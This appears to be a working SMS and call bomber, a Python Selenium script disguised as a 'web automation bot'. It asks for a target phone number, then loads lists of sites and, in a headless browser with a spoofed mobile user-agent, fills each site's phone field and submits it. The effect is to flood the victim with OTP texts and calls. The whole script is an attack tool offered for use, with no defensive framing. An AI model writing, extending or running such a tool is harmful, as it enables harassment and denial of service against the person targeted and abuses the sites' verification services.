import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

# --- CONFIGURATION ---
SMS_FILE = "sms.txt"
CALL_FILE = "call.txt"

success = 0
failed = 0

def load_links(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip() and line.startswith("http")]

def create_driver():
    options = Options()
    options.add_argument("--headless") 
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
    
    # Termux Fixed Path for Chromedriver
    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
    
    try:
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(25)
        return driver
    except Exception as e:
        print(f"Driver Error: {str(e)}")
        return None

def auto_detect_and_send(driver, mobile):
    try:
        m_box = None
        inputs = driver.find_elements(By.TAG_NAME, "input")
        for i in inputs:
            attr = (i.get_attribute("type") or "") + (i.get_attribute("name") or "") + (i.get_attribute("placeholder") or "")
            attr = attr.lower()
            if any(x in attr for x in ["tel", "mobile", "phone", "number"]):
                m_box = i
                break
        
        if not m_box: return False

        btn = None
        buttons = driver.find_elements(By.TAG_NAME, "button")
        if not buttons:
            buttons = driver.find_elements(By.XPATH, "//input[@type='submit' or @type='button']")
        
        if buttons:
            btn = buttons[0]
            m_box.send_keys(mobile)
            time.sleep(1)
            btn.click()
            time.sleep(2)
            return True
    except:
        pass
    return False

def attempt(site, mobile):
    global success, failed
    driver = create_driver()
    if not driver:
        failed += 1
        return

    try:
        driver.get(site)
        time.sleep(5)
        if auto_detect_and_send(driver, mobile):
            print(f"[+] SUCCESS: {site}")
            success += 1
        else:
            print(f"[-] FAILED (No Input): {site}")
            failed += 1
    except Exception:
        print(f"[!] ERROR: {site}")
        failed += 1
    finally:
        driver.quit()

def main():
    os.system("clear")
    print("==============================")
    print("      WEB AUTOMATION BOT      ")
    print("==============================\n")
    
    mobile = input("Enter Target Number: ")
    sms_links = load_links(SMS_FILE)
    call_links = load_links(CALL_FILE)
    
    print(f"\nLoaded: {len(sms_links)} SMS sites | {len(call_links)} Call sites")
    print("\nSelect Mode: 1.SMS | 2.Call | 3.Both")
    choice = input("\nChoice: ")
    
    targets = []
    if choice == "1": targets = sms_links
    elif choice == "2": targets = call_links
    elif choice == "3": targets = sms_links + call_links
    
    if not targets:
        print("No links found!")
        return

    print(f"\nRunning on {len(targets)} sites...")

    for site in targets:
        attempt(site, mobile)
        time.sleep(1)

    print(f"\n--- FINISHED ---")
    print(f"Total Success: {success} | Total Failed: {failed}")

if __name__ == "__main__":
    main()
